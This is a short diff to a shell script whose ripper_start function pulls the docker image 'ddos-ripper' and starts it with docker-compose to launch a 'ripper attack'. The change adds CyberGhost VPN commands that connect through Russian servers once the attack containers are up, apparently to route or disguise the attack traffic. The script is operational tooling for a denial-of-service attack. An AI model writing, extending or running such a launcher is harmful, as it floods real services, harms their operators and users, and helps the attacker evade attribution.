@@ -33,8 +33,10 @@ function generate_compose {
 
 function ripper_start {
   echo "Starting ripper attack"
+  cyberghostvpn --stop
   docker pull nitupkcuf/ddos-ripper
   docker-compose up -d
+  cyberghostvpn --traffic --country-code RU --connect
 }
 
 function ripper_stop {
